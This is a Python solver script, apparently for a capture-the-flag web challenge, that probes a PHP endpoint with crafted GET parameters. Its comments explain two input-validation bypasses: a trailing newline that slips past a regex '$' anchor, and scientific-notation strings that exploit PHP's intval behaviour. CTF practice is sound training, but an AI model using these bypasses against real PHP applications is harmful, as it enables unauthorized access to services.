import urllib.request, urllib.parse, re, html as _html

url = 'http://80-2005f10e-b861-4aa9-8f0c-bc279804f290.challenge.ctfplus.cn'

def test(params_get, post_data=None):
    """Test with GET params and optional POST body"""
    full_url = url + '?' + urllib.parse.urlencode(params_get)
    req = urllib.request.Request(full_url, data=post_data, headers={
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded'
    })
    resp = urllib.request.urlopen(req, timeout=10)
    body = _html.unescape(re.sub(r'<[^>]+>', '', resp.read().decode('utf-8', errors='replace')))
    # Show response (skip the PHP source)
    idx = body.find('?>')
    return body[idx+2:].strip() if idx > 0 else body[:200]

# ===== Layer 1: syc bypass =====
# Need: preg_match('/^Welcome to GEEK 2023!$/i', $syc) && $syc !== 'Welcome to GEEK 2023!'
# Trick: add trailing newline — $ matches before \n without D modifier
for syc_val in ["Welcome to GEEK 2023!\n", "Welcome to GEEK 2023!\r\n", "Welcome to GEEK 2023! "]:
    r = test({'syc': syc_val})
    print(f"L1 [{repr(syc_val[:30])}] -> {r[:80]}")

# ===== Layer 1+2: syc + lover bypass =====
# intval($x) < 2023 && intval($x + 1) > 2024
# Trick: 2022e1 → intval reads 2022 (<2023), but string+1 = 20220+1=20221 (>2024)
for lover_val in ['2022e1', '2022e2', '2022e0', '2022e3']:
    r = test({'syc': "Welcome to GEEK 2023!\n", 'lover': lover_val})
    print(f"L2 [{lover_val}] -> {r[:80]}")
